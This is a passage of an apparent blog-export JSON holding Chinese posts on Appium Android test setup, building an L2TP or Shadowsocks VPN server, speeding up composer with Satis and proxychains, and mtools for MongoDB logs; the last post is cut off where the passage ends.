markdown--><blockquote>\n<p>如果你曾接触过Selenium的话, 那么, Appium就是一个移动端的 Selenium, Appium通过调用Andriod SDK提供的API实现对应用的操作, 从而实现对各种功能的模拟测试.</p>\n</blockquote>\n<p>Android Test with <a href=\"http://appium.io\">Appium</a> （written with <a href=\"https://github.com/appium/python-client\">python client</a>）</p>\n<h6 id=\"android\">环境准备(Android)</h6>\n<ul>\n<li>\n<p>Windows</p>\n<pre><code>  1. 安装JAVA: 可从官网获取JDK1.8安装包\n  2. 安装ANDROID SDK MANAGER: 可从官网获取ANDROID SDK MANAGER安装包, 并配置环境变量 ANDROID_HOME 到 ANDROID SDK 安装目录, 如：D:\\Program Files\\Android\\android-sdk\n  3. 通过ANDROID SDK MANAGER安装所需的版本的ANDROID SDK\n  4. 安装appium:  可从[官网](http://appium.io/)获取\n  5. （可选）建议安装新版nodejs: appium自带10.x.x版nodejs, 建议自行从官网安装新版\n</code></pre>\n</li>\n</ul>\n<p>安装完成后可通过Appium安装目录下 <code>Appium\\node_modules\\.bin\\appium-doctor</code> 检查appium环境是否正确安装</p>\n<p>更详细的说明可以阅读官方文档：<a href=\"http://appium.io/slate/cn/v1.4.5/?python#%E5%9C%A8windows%E4%B8%8A%E8%BF%90%E8%A1%8Cappium\">在windows上运行appium</a></p>\n<ul>\n<li>\n<p>Linux</p>\n<pre><code>  1. 安装JAVA: 略\n  2. 安装ANDROID SDK MANAGER: [可从官网获取](http://developer.android.com/sdk/index.html), 可能要翻墙。 添加环境变量ANDROID_HOME\n  3. 通过ANDROID SDK MANAGER安装所需的版本的ANDROID SDK\n  4. 安装Appium：npm -g install appium, 很慢且不稳定， 建议翻墙，大约100M\n  5. 安装nodejs: 建议从官网获取新版本(https://nodejs.org/)\n</code></pre>\n</li>\n</ul>\n<p>安装完成后可通过 <code>appium-doctor</code> 检查appium环境是否正确安装</p>\n<p>更详细的说明可以阅读官方文档：<a href=\"http://appium.io/slate/cn/v1.4.5/?python#%E5%9C%A8-linux-%E4%B8%8A%E8%BF%90%E8%A1%8C-appium\">在Linux上运行Appium</a></p>\n<h6 id=\"\">开发工具</h6>\n<p>本项目采用了 <a href=\"https://github.com/appium/python-client\">Appium Python Client</a> 作为开发包，所以请安装python 2.* 及所需的IDE, 强力推荐 JetBrains 家的 <a href=\"http://www.jetbrains.com/pycharm/\">PyCharm</a></p>\n<p>项目测试框架为 <a href=\"http://pytest.org/latest/\">pytest</a> 及 <a href=\"https://docs.python.org/2/library/unittest.html\">unittest</a>, 具体用法可参考官方文档</p>\n<h6 id=\"\">启动项目</h6>\n<pre><code>1. 连接设备（真机或模拟器）, `adb devices` 能看到设备即表示成功，Windows下通过豌豆荚等手机助手连接是最简单的方式\n2. 启动appium服务, Linux:`appium` \\ Windows: 打开appium，设置Device Name，启动服务\n3. 运行测试， 命令行 py.test test.py 执行，或在IDE中运行测试（PyCharm Ctrl+Shift+F10）。\n</code></pre>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"43","plaintext":"> 如果你曾接触过Selenium的话, 那么, Appium就是一个移动端的 Selenium, Appium通过调用Andriod\nSDK提供的API实现对应用的操作, 从而实现对各种功能的模拟测试.\n\n\nAndroid Test with Appium [http://appium.io]  （written with python client\n[https://github.com/appium/python-client]）\n\n环境准备(Android)\n * Windows\n   \n     1. 安装JAVA: 可从官网获取JDK1.8安装包\n     2. 安装ANDROID SDK MANAGER: 可从官网获取ANDROID SDK MANAGER安装包, 并配置环境变量 ANDROID_HOME 到 ANDROID SDK 安装目录, 如：D:\\Program Files\\Android\\android-sdk\n     3. 通过ANDROID SDK MANAGER安装所需的版本的ANDROID SDK\n     4. 安装appium:  可从[官网](http://appium.io/)获取\n     5. （可选）建议安装新版nodejs: appium自带10.x.x版nodejs, 建议自行从官网安装新版\n   \n   \n   \n\n安装完成后可通过Appium安装目录下 Appium\\node_modules\\.bin\\appium-doctor  检查appium环境是否正确安装\n\n更详细的说明可以阅读官方文档：在windows上运行appium\n[http://appium.io/slate/cn/v1.4.5/?python#%E5%9C%A8windows%E4%B8%8A%E8%BF%90%E8%A1%8Cappium]\n\n * Linux\n   \n     1. 安装JAVA: 略\n     2. 安装ANDROID SDK MANAGER: [可从官网获取](http://developer.android.com/sdk/index.html), 可能要翻墙。 添加环境变量ANDROID_HOME\n     3. 通过ANDROID SDK MANAGER安装所需的版本的ANDROID SDK\n     4. 安装Appium：npm -g install appium, 很慢且不稳定， 建议翻墙，大约100M\n     5. 安装nodejs: 建议从官网获取新版本(https://nodejs.org/)\n   \n   \n   \n\n安装完成后可通过 appium-doctor  检查appium环境是否正确安装\n\n更详细的说明可以阅读官方文档：在Linux上运行Appium\n[http://appium.io/slate/cn/v1.4.5/?python#%E5%9C%A8-linux-%E4%B8%8A%E8%BF%90%E8%A1%8C-appium]\n\n开发工具\n本项目采用了 Appium Python Client [https://github.com/appium/python-client] \n作为开发包，所以请安装python 2.* 及所需的IDE, 强力推荐 JetBrains 家的 PyCharm\n[http://www.jetbrains.com/pycharm/]\n\n项目测试框架为 pytest [http://pytest.org/latest/]  及 unittest\n[https://docs.python.org/2/library/unittest.html], 具体用法可参考官方文档\n\n启动项目\n1. 连接设备（真机或模拟器）, `adb devices` 能看到设备即表示成功，Windows下通过豌豆荚等手机助手连接是最简单的方式\n2. 启动appium服务, Linux:`appium` \\ Windows: 打开appium，设置Device Name，启动服务\n3. 运行测试， 命令行 py.test test.py 执行，或在IDE中运行测试（PyCharm Ctrl+Shift+F10）。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-08-12 12:01:38","updated_at":"2016-02-11 05:51:42","published_at":"2016-01-09 03:12:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e6f","uuid":"60ba84e5-e991-4c96-b3d1-08b5d4a8d120","title":"如何快速搭建一个VPN服务器","slug":"setup-a-personal-vpn-server","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"这里提供两种快速搭建一个VPN服务器的方案（首先，你需要准备一台墙外的 *nix 服务器）。\\n\\n#### L2TP \\n\\n\\nL2TP服务器的搭建过程相对比较麻烦，不过Github上总会有不少前人造好的轮子，我们所要做的只是了解如何使用它 [setup-simple-ipsec-l2tp-vpn](https://github.com/philplckthun/setup-simple-ipsec-l2tp-vpn)。\\n    \\nclone下项目后，根据自己的系统环境，执行对应的setup.sh脚本。以CentOS为例：\\n    \\n    \\t$ ./setup_centos.sh\\n        \\n安装完成后，还需要配置iptables转发规则\\n   \\t\\t\\n        $ echo 1 > /proc/sys/net/ipv4/ip_forward #开启ipv4转发\\n        iptables -t nat -A POSTROUTING -s 192.168.42.0/24 -o eth1 -j MASQUERADE  #将ppp数据转发至公网网卡（规则中的IP网段和网卡变化根据实际情况确定）\\n        $ iptables-save\\n        $ service iptables restart\\n   \\n执行`iptables-save`后，转发规则默认会被保存在 `/etc/sysconfig/iptables` 中。启动相关服务：\\n \\n\\t    $ service xl2tpd strat\\n        $ service ipsec start\\n        \\n请查看 1701, 500, 4500 端口是否打开以确保服务是否已经正常启动。\\n        \\n账号信息将被保存在 `/etc/ppp/chap-secrets` 中，可通过编辑该文件进行管理。\\n        \\n        \\n#### Shadowsocks（推荐）\\n\\t\\n与L2TP相比，Shadowsocks服务器搭建更加简单，这里同样以CentOS为例：\\n    \\n        $ yum install python-pip\\n        $ pip install shadowsocks\\n        \\n通过shadowsocks python 包提供了两个工具：`ssserver`和`sslocal`。\\n`ssserver` 为shadowsocks服务端，创建服务器配置文件 `ss.json`:\\n    \\n    \\t{\\n    \\t\\t\\\"server\\\":\\\"123.123.213.213\\\",\\n    \\t\\t\\\"server_port\\\":8388,\\n    \\t\\t\\\"password\\\":\\\"yourpassword\\\",\\n    \\t\\t\\\"method\\\":\\\"aes-256-cfb\\\"        \\n\\t\\t}\\n启动shadowsocks服务：\\n    \\t\\n        $ ssserver -c ss.json\\n        \\n配置客户端 `ss.conf`：\\n\\n\\t\\t{\\n\\t\\t\\t\\\"server\\\" : \\\"123.123.213.213\\\",\\n\\t\\t\\t\\\"server_port\\\" : 8388,\\n\\t\\t\\t\\\"local_port\\\" : 1080,\\n\\t\\t\\t\\\"password\\\" : \\\"yourpassword\\\",\\n\\t\\t\\t\\\"timeout\\\" : 600,\\n\\t\\t\\t\\\"method\\\" : \\\"aes-256-cfb\\\"\\n        }\\n    \\n启动客户端：\\n    \\n    $ sslocal -c ss.conf\\n    \\n另外，强烈推荐 [SwitchyOmega](https://github.com/FelisCatus/SwitchyOmega) 这个Chrome插件，配合shadowsocks 使用起来十分方便。\\n    \\n`ssserver` 与 `sslocal` 均可通过[supervisor](http://blog.chxj.name/manage-process-by-supervisor/)进行管理，以确保服务能可靠的运行。\\n\\n\\n最后，谨在这里向优秀的黑客 [@clowwindy](https://github.com/clowwindy) 致敬，我们从来没有停下过追逐自由的脚步。\\n\\n![](/content/images/2015/08/mmexport1440689562821.jpg)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>这里提供两种快速搭建一个VPN服务器的方案（首先，你需要准备一台墙外的 *nix 服务器）。</p>\n<h4 id=\"l2tp\">L2TP</h4>\n<p>L2TP服务器的搭建过程相对比较麻烦，不过Github上总会有不少前人造好的轮子，我们所要做的只是了解如何使用它 <a href=\"https://github.com/philplckthun/setup-simple-ipsec-l2tp-vpn\">setup-simple-ipsec-l2tp-vpn</a>。</p>\n<p>clone下项目后，根据自己的系统环境，执行对应的setup.sh脚本。以CentOS为例：</p>\n<pre><code>\t$ ./setup_centos.sh\n</code></pre>\n<p>安装完成后，还需要配置iptables转发规则</p>\n<pre><code>    $ echo 1 &gt; /proc/sys/net/ipv4/ip_forward #开启ipv4转发\n    iptables -t nat -A POSTROUTING -s 192.168.42.0/24 -o eth1 -j MASQUERADE  #将ppp数据转发至公网网卡（规则中的IP网段和网卡变化根据实际情况确定）\n    $ iptables-save\n    $ service iptables restart\n</code></pre>\n<p>执行<code>iptables-save</code>后，转发规则默认会被保存在 <code>/etc/sysconfig/iptables</code> 中。启动相关服务：</p>\n<pre><code>    $ service xl2tpd strat\n    $ service ipsec start\n</code></pre>\n<p>请查看 1701, 500, 4500 端口是否打开以确保服务是否已经正常启动。</p>\n<p>账号信息将被保存在 <code>/etc/ppp/chap-secrets</code> 中，可通过编辑该文件进行管理。</p>\n<h4 id=\"shadowsocks\">Shadowsocks（推荐）</h4>\n<p>与L2TP相比，Shadowsocks服务器搭建更加简单，这里同样以CentOS为例：</p>\n<pre><code>    $ yum install python-pip\n    $ pip install shadowsocks\n</code></pre>\n<p>通过shadowsocks python 包提供了两个工具：<code>ssserver</code>和<code>sslocal</code>。<br>\n<code>ssserver</code> 为shadowsocks服务端，创建服务器配置文件 <code>ss.json</code>:</p>\n<pre><code>\t{\n\t\t&quot;server&quot;:&quot;123.123.213.213&quot;,\n\t\t&quot;server_port&quot;:8388,\n\t\t&quot;password&quot;:&quot;yourpassword&quot;,\n\t\t&quot;method&quot;:&quot;aes-256-cfb&quot;        \n\t}\n</code></pre>\n<p>启动shadowsocks服务：</p>\n<pre><code>    $ ssserver -c ss.json\n</code></pre>\n<p>配置客户端 <code>ss.conf</code>：</p>\n<pre><code>\t{\n\t\t&quot;server&quot; : &quot;123.123.213.213&quot;,\n\t\t&quot;server_port&quot; : 8388,\n\t\t&quot;local_port&quot; : 1080,\n\t\t&quot;password&quot; : &quot;yourpassword&quot;,\n\t\t&quot;timeout&quot; : 600,\n\t\t&quot;method&quot; : &quot;aes-256-cfb&quot;\n    }\n</code></pre>\n<p>启动客户端：</p>\n<pre><code>$ sslocal -c ss.conf\n</code></pre>\n<p>另外，强烈推荐 <a href=\"https://github.com/FelisCatus/SwitchyOmega\">SwitchyOmega</a> 这个Chrome插件，配合shadowsocks 使用起来十分方便。</p>\n<p><code>ssserver</code> 与 <code>sslocal</code> 均可通过<a href=\"http://blog.chxj.name/manage-process-by-supervisor/\">supervisor</a>进行管理，以确保服务能可靠的运行。</p>\n<p>最后，谨在这里向优秀的黑客 <a href=\"https://github.com/clowwindy\">@clowwindy</a> 致敬，我们从来没有停下过追逐自由的脚步。</p>\n<p><img src=\"/content/images/2015/08/mmexport1440689562821.jpg\" alt=\"\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"44","plaintext":"这里提供两种快速搭建一个VPN服务器的方案（首先，你需要准备一台墙外的 *nix 服务器）。\n\nL2TP\nL2TP服务器的搭建过程相对比较麻烦，不过Github上总会有不少前人造好的轮子，我们所要做的只是了解如何使用它 \nsetup-simple-ipsec-l2tp-vpn\n[https://github.com/philplckthun/setup-simple-ipsec-l2tp-vpn]。\n\nclone下项目后，根据自己的系统环境，执行对应的setup.sh脚本。以CentOS为例：\n\n\t$ ./setup_centos.sh\n\n\n安装完成后，还需要配置iptables转发规则\n\n    $ echo 1 > /proc/sys/net/ipv4/ip_forward #开启ipv4转发\n    iptables -t nat -A POSTROUTING -s 192.168.42.0/24 -o eth1 -j MASQUERADE  #将ppp数据转发至公网网卡（规则中的IP网段和网卡变化根据实际情况确定）\n    $ iptables-save\n    $ service iptables restart\n\n\n执行iptables-save后，转发规则默认会被保存在 /etc/sysconfig/iptables  中。启动相关服务：\n\n    $ service xl2tpd strat\n    $ service ipsec start\n\n\n请查看 1701, 500, 4500 端口是否打开以确保服务是否已经正常启动。\n\n账号信息将被保存在 /etc/ppp/chap-secrets  中，可通过编辑该文件进行管理。\n\nShadowsocks（推荐）\n与L2TP相比，Shadowsocks服务器搭建更加简单，这里同样以CentOS为例：\n\n    $ yum install python-pip\n    $ pip install shadowsocks\n\n\n通过shadowsocks python 包提供了两个工具：ssserver和sslocal。\nssserver  为shadowsocks服务端，创建服务器配置文件 ss.json:\n\n\t{\n\t\t\"server\":\"123.123.213.213\",\n\t\t\"server_port\":8388,\n\t\t\"password\":\"yourpassword\",\n\t\t\"method\":\"aes-256-cfb\"        \n\t}\n\n\n启动shadowsocks服务：\n\n    $ ssserver -c ss.json\n\n\n配置客户端 ss.conf：\n\n\t{\n\t\t\"server\" : \"123.123.213.213\",\n\t\t\"server_port\" : 8388,\n\t\t\"local_port\" : 1080,\n\t\t\"password\" : \"yourpassword\",\n\t\t\"timeout\" : 600,\n\t\t\"method\" : \"aes-256-cfb\"\n    }\n\n\n启动客户端：\n\n$ sslocal -c ss.conf\n\n\n另外，强烈推荐 SwitchyOmega [https://github.com/FelisCatus/SwitchyOmega] \n这个Chrome插件，配合shadowsocks 使用起来十分方便。\n\nssserver  与 sslocal  均可通过supervisor\n[http://blog.chxj.name/manage-process-by-supervisor/]进行管理，以确保服务能可靠的运行。\n\n最后，谨在这里向优秀的黑客 @clowwindy [https://github.com/clowwindy]  致敬，我们从来没有停下过追逐自由的脚步。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":"如何快速搭建一个VPN服务器","meta_description":"VPN 翻墙 L2TP Shadowsocks ","author_id":"1","created_at":"2015-08-26 02:02:43","updated_at":"2017-06-30 02:50:34","published_at":"2015-08-27 16:56:39","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e70","uuid":"e5019604-921e-43f1-a8b3-7a66db94beb3","title":"如何正确使用composer","slug":"use-composer-in-the-right-way","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> composer 是一款优秀的PHP依赖管理工具，正如pip之于python、gem之于ruby、gem之于node。无论任何一门语言，在现代软件开发实践中，依赖管理对于开发者而言都是必不可少的一个部分。敏捷开发强调不要重复造轮子，而依赖管理工具则提供了一种最容易的方式帮助我们方便的获取到别人造好的漂亮轮子，并且完美的安插到我们的项目之中。理想总是好的，但当理想落地成为现实的时候，一切又变得不那么美好，尤其是当它准备落在中国的土地上。\\n\\n因为众所周知的原因，composer在国内并不好用，虽然在PHP社区里也有一些为国内开发者提供的镜像网站，然而经过尝试，这些镜像的表现也不尽人意，常常出现502等让开发者们叫苦不迭。简单分析一下，composer更新缓慢主要在两个地方，**一是从packgist获取依赖包的下载地址时常常会卡死(也就是: Loading composer repositories with package information 这一步); 二是从github下载文件时,有时会因为网络请求超时而中断**\\n\\n##### 自建镜像\\n\\n[Satis](https://github.com/composer/satis)是composer官方提供的一个搭建私有镜像的工具, clone satis 到自己的服务器以后, 在配置文件中申明需要的依赖, 如:\\n \\n     {\\n        \\\"repositories\\\": [ { \\\"type\\\": \\\"composer\\\", \\\"url\\\": \\\"http://packages.example.org/\\\" } ],\\n        \\\"require\\\": {\\n            \\\"company/package\\\": \\\"1.2.0\\\",\\n            \\\"company/package2\\\": \\\"1.5.2\\\",\\n            \\\"company/package3\\\": \\\"dev-master\\\"\\n        }\\n    }\\n    \\n然后通过命令行工具生成镜像网站即可,如:\\n    \\n    $ php bin/satis build satis.json web/\\n    \\n最后, 在使用时和其他的镜像一样, 在composer.json中用自己的镜像地址替换composer官方镜像地址:\\n\\n    {\\n        \\\"repositories\\\": [\\n            {\\\"type\\\": \\\"composer\\\", \\\"url\\\": \\\"http://packages.example.org/\\\"},\\n            {\\\"packagist\\\": false}\\n        ]\\n    }\\n   \\n\\n更多细节,可参考 [官方文档](https://getcomposer.org/doc/articles/handling-private-packages-with-satis.md#satis)\\n\\n##### 终极方案 \\n\\nstatis所能解决的问题仅仅是第一步, 也就是从packagist获取下载地址的那个部分, composer 得到依赖包的地址以后,还需要从 Github 上去获取这些依赖。而有的时候，访问Github也会时不时出现超时的情况, composer更新到一半挂掉了, 这种时候satis并没有什么卵用。所以, 还是翻墙吧。\\n\\n`proxychains` 是 *Nix 下一款好用的小工具, 在Ubuntu下,你可以直接通过 `apt-get install proxychains` 获取到。\\n\\n`proxychains`默认的配置文件在`/etc/proxychains.conf`中，基本配置项包括代理方式（Http|Socks4|Socks5），代理模式（严格|动态|随机）及超时控制等，最后，你需要在行尾加入你要连接的代理客户端配置，如：\\n    \\n    [ProxyList]\\n    socks5 127.0.0.1 1080\\n    \\n通过 `proxychains` 你能让所有的命令行工具(如: composer)通过代理访问网络, 实现这一点, 你只需要在原本的命令之前加上 `proxychains`即可，如：\\n    \\n    $ proxychains composer install \\n    \\n  ![composer-with-proxychains](/content/images/2015/09/composer-with-proxychains.png)\\n  \\n现在看起来就满意多了。\\n    \\n最后，读者如果想要自己搭建VPN服务器，可以参考这篇博客[《如何快速搭建一个VPN服务器》](http://blog.chxj.name/setup-a-personal-vpn-server/), 个人仍然推荐采用 shadowsocks 的方式来搭建VPN服务。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>composer 是一款优秀的PHP依赖管理工具，正如pip之于python、gem之于ruby、gem之于node。无论任何一门语言，在现代软件开发实践中，依赖管理对于开发者而言都是必不可少的一个部分。敏捷开发强调不要重复造轮子，而依赖管理工具则提供了一种最容易的方式帮助我们方便的获取到别人造好的漂亮轮子，并且完美的安插到我们的项目之中。理想总是好的，但当理想落地成为现实的时候，一切又变得不那么美好，尤其是当它准备落在中国的土地上。</p>\n</blockquote>\n<p>因为众所周知的原因，composer在国内并不好用，虽然在PHP社区里也有一些为国内开发者提供的镜像网站，然而经过尝试，这些镜像的表现也不尽人意，常常出现502等让开发者们叫苦不迭。简单分析一下，composer更新缓慢主要在两个地方，<strong>一是从packgist获取依赖包的下载地址时常常会卡死(也就是: Loading composer repositories with package information 这一步); 二是从github下载文件时,有时会因为网络请求超时而中断</strong></p>\n<h5 id=\"\">自建镜像</h5>\n<p><a href=\"https://github.com/composer/satis\">Satis</a>是composer官方提供的一个搭建私有镜像的工具, clone satis 到自己的服务器以后, 在配置文件中申明需要的依赖, 如:</p>\n<pre><code> {\n    &quot;repositories&quot;: [ { &quot;type&quot;: &quot;composer&quot;, &quot;url&quot;: &quot;http://packages.example.org/&quot; } ],\n    &quot;require&quot;: {\n        &quot;company/package&quot;: &quot;1.2.0&quot;,\n        &quot;company/package2&quot;: &quot;1.5.2&quot;,\n        &quot;company/package3&quot;: &quot;dev-master&quot;\n    }\n}\n</code></pre>\n<p>然后通过命令行工具生成镜像网站即可,如:</p>\n<pre><code>$ php bin/satis build satis.json web/\n</code></pre>\n<p>最后, 在使用时和其他的镜像一样, 在composer.json中用自己的镜像地址替换composer官方镜像地址:</p>\n<pre><code>{\n    &quot;repositories&quot;: [\n        {&quot;type&quot;: &quot;composer&quot;, &quot;url&quot;: &quot;http://packages.example.org/&quot;},\n        {&quot;packagist&quot;: false}\n    ]\n}\n</code></pre>\n<p>更多细节,可参考 <a href=\"https://getcomposer.org/doc/articles/handling-private-packages-with-satis.md#satis\">官方文档</a></p>\n<h5 id=\"\">终极方案</h5>\n<p>statis所能解决的问题仅仅是第一步, 也就是从packagist获取下载地址的那个部分, composer 得到依赖包的地址以后,还需要从 Github 上去获取这些依赖。而有的时候，访问Github也会时不时出现超时的情况, composer更新到一半挂掉了, 这种时候satis并没有什么卵用。所以, 还是翻墙吧。</p>\n<p><code>proxychains</code> 是 *Nix 下一款好用的小工具, 在Ubuntu下,你可以直接通过 <code>apt-get install proxychains</code> 获取到。</p>\n<p><code>proxychains</code>默认的配置文件在<code>/etc/proxychains.conf</code>中，基本配置项包括代理方式（Http|Socks4|Socks5），代理模式（严格|动态|随机）及超时控制等，最后，你需要在行尾加入你要连接的代理客户端配置，如：</p>\n<pre><code>[ProxyList]\nsocks5 127.0.0.1 1080\n</code></pre>\n<p>通过 <code>proxychains</code> 你能让所有的命令行工具(如: composer)通过代理访问网络, 实现这一点, 你只需要在原本的命令之前加上 <code>proxychains</code>即可，如：</p>\n<pre><code>$ proxychains composer install \n</code></pre>\n<p><img src=\"/content/images/2015/09/composer-with-proxychains.png\" alt=\"composer-with-proxychains\"></p>\n<p>现在看起来就满意多了。</p>\n<p>最后，读者如果想要自己搭建VPN服务器，可以参考这篇博客<a href=\"http://blog.chxj.name/setup-a-personal-vpn-server/\">《如何快速搭建一个VPN服务器》</a>, 个人仍然推荐采用 shadowsocks 的方式来搭建VPN服务。</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"45","plaintext":"> composer\n是一款优秀的PHP依赖管理工具，正如pip之于python、gem之于ruby、gem之于node。无论任何一门语言，在现代软件开发实践中，依赖管理对于开发者而言都是必不可少的一个部分。敏捷开发强调不要重复造轮子，而依赖管理工具则提供了一种最容易的方式帮助我们方便的获取到别人造好的漂亮轮子，并且完美的安插到我们的项目之中。理想总是好的，但当理想落地成为现实的时候，一切又变得不那么美好，尤其是当它准备落在中国的土地上。\n\n\n因为众所周知的原因，composer在国内并不好用，虽然在PHP社区里也有一些为国内开发者提供的镜像网站，然而经过尝试，这些镜像的表现也不尽人意，常常出现502等让开发者们叫苦不迭。简单分析一下，composer更新缓慢主要在两个地方，\n一是从packgist获取依赖包的下载地址时常常会卡死(也就是: Loading composer repositories with package\ninformation 这一步); 二是从github下载文件时,有时会因为网络请求超时而中断\n\n自建镜像\nSatis [https://github.com/composer/satis]是composer官方提供的一个搭建私有镜像的工具, clone satis\n到自己的服务器以后, 在配置文件中申明需要的依赖, 如:\n\n {\n    \"repositories\": [ { \"type\": \"composer\", \"url\": \"http://packages.example.org/\" } ],\n    \"require\": {\n        \"company/package\": \"1.2.0\",\n        \"company/package2\": \"1.5.2\",\n        \"company/package3\": \"dev-master\"\n    }\n}\n\n\n然后通过命令行工具生成镜像网站即可,如:\n\n$ php bin/satis build satis.json web/\n\n\n最后, 在使用时和其他的镜像一样, 在composer.json中用自己的镜像地址替换composer官方镜像地址:\n\n{\n    \"repositories\": [\n        {\"type\": \"composer\", \"url\": \"http://packages.example.org/\"},\n        {\"packagist\": false}\n    ]\n}\n\n\n更多细节,可参考 官方文档\n[https://getcomposer.org/doc/articles/handling-private-packages-with-satis.md#satis]\n\n终极方案\nstatis所能解决的问题仅仅是第一步, 也就是从packagist获取下载地址的那个部分, composer 得到依赖包的地址以后,还需要从 Github\n上去获取这些依赖。而有的时候，访问Github也会时不时出现超时的情况, composer更新到一半挂掉了, 这种时候satis并没有什么卵用。所以,\n还是翻墙吧。\n\nproxychains  是 *Nix 下一款好用的小工具, 在Ubuntu下,你可以直接通过 apt-get install proxychains \n获取到。\n\nproxychains默认的配置文件在/etc/proxychains.conf\n中，基本配置项包括代理方式（Http|Socks4|Socks5），代理模式（严格|动态|随机）及超时控制等，最后，你需要在行尾加入你要连接的代理客户端配置，如：\n\n[ProxyList]\nsocks5 127.0.0.1 1080\n\n\n通过 proxychains  你能让所有的命令行工具(如: composer)通过代理访问网络, 实现这一点, 你只需要在原本的命令之前加上 \nproxychains即可，如：\n\n$ proxychains composer install \n\n\n\n\n现在看起来就满意多了。\n\n最后，读者如果想要自己搭建VPN服务器，可以参考这篇博客《如何快速搭建一个VPN服务器》\n[http://blog.chxj.name/setup-a-personal-vpn-server/], 个人仍然推荐采用 shadowsocks\n的方式来搭建VPN服务。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":"如何正确使用composer","meta_description":"packagist composer 速度慢 composer install 超时","author_id":"1","created_at":"2015-09-04 16:05:15","updated_at":"2017-01-10 02:57:16","published_at":"2015-09-04 17:14:56","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e71","uuid":"29f1f8e6-c8d0-4aef-83fd-f5798c32a2c0","title":"MongoDB日志分析工具 mtools","slug":"mongodb-logs-analysis-tools","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> mtools 是一组用于分析mongodb日志文件的小工具集，它们的功能就和你想象中的一样。\\n\\n* mlogfilter： 帮助我们方便地从全部日志文件中筛选出部分数据，比如只看特定时间内的日志或者特定数据集合的日志\\n* mplotqueries：根据条件生成对应的图表数据，比如对集合的查询操作随时间变化的分布及每次查询的扫表次数\\n* mlogvis：和mplotqueries类似，不过是web版的\\n\\n借助图表，我们可以更容易地观察到一些现象并得出结论，比如某种数据的查询次数随时间变换的规律，或者是发现某类查询的扫表次数特别的高，这也许是因为涉及的条件字段没有加索引导致的，诸如此类。\\n\\n更多细节可以参考 [官方文档](https://github.com/rueckstiess/mtools/wiki)\\n\\n![](/content/images/2016/02/092113.png)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>mtools 是一组用于分析mongodb日志文件的小工具集，它们的功能就和你想象中的一样。</p>\n</blockquote>\n<ul>\n<li>mlogfilter： 帮助我们方便地从全部日志文件中筛选出部分数据，比如只看特定时间内的日志或者特定数据集合的日志</li>\n<li>mplotqueries：根据条件生成对应的图表数据，比如对集合的查询操作随时间变化的分布及每次查询的扫表次数</li>\n<li>mlogvis：和mplotqueries类似，不过是web版的</li>\n</ul>\n<p>借助图表，我们可以更容易地观察到一些现象并得出结论，比如某种数据的查询次数随时间变换的规律，或者是发现某类查询的扫表次数特别的高，这也许是因为涉及的条件字段没有加索引导致的，诸如此类。</p>\n<p>更多细节可以参考 <a href=\"https://github.com/rueckstiess/mtools/wiki\">官方文档</a></p>\n<p><img src=\"/content/images/2016/02/092113.png\" alt=\"\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"48","plaintext":"> mtools 是一组用于分析mongodb日志文件的小工具集，它们的功能就和你想象中的一样。\n\n\n * mlogfilter： 帮助我们方便地从全部日志文件中筛选出部分数据，比如只看特定时间内的日志或者特定数据集合的日志\n * mplotqueries：根据条件生成对应的图表数据，比如对集合的查询操作随时间变化的分布及每次查询的扫表次数\n * mlogvis：和mplotqueries类似，不过是web版的\n\n借助图表，我们可以更容易地观察到一些现象并得出结论，比如某种数据的查询次数随时间变换的规律，或者是发现某类查询的扫表次数特别的高，这也许是因为涉及的条件字段没有加索引导致的，诸如此类。\n\n更多细节可以参考 官方文档 [https://github.com/rueckstiess/mtools/wiki]","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-09-22 07:02:23","updated_at":"2016-02-12 07:25:58","published_at":"2016-02-12 07:25:58","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e72","uuid":"fb3456d6-3cd7-4004-9949-2b03f67084b6","title":"Vagrant + PHPStorm 搭建虚拟化开发环境的实践方案","slug":"setting-up-vitual-develop-environment-by-vagrant","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 那么，在开始之前，我们先来思考几个问题 ...\\n\\n* 